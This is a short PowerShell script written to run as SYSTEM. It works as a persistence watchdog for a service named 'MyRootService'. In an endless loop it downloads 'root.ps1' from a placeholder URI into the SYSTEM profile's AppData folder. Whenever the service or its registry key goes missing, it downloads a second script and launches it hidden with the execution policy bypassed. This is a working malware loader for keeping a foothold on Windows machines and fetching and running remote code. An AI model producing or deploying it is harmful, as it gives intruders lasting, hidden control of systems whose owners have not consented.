#script must run as admin/SYSTEM
param(
    [string]$rootPath
)

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local"
)

$serviceName = "MyRootService" # change this to the name of the service
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
if(($rootPath -eq "") -or ($rootPath -eq $null)){
    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    $rootPath = $paths[$idx]
    $rootPath = "$rootPath\root.ps1"
}else{
    $rootPath = "$rootPath\root.ps1"
}
$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$initServicePath = $paths[$idx]
$initServicePath = "$initServicePath\init_service_root.ps1"

function Check-ServiceReg{
    $c = Get-Item -Path $regPath -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Check-Service{
    try {
        $d = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

while ($true) {
    $regS = Check-ServiceReg
    $serv = Check-Service

    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
        iwr -uri "ROOT_SCRIPT_URI" -OutFile $rootPath
    }
    
    if($regS -or $serv){
        iwr -uri "INTI_SERVICE_ROOT_URI" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath
    }
    Start-Sleep -Seconds 5
}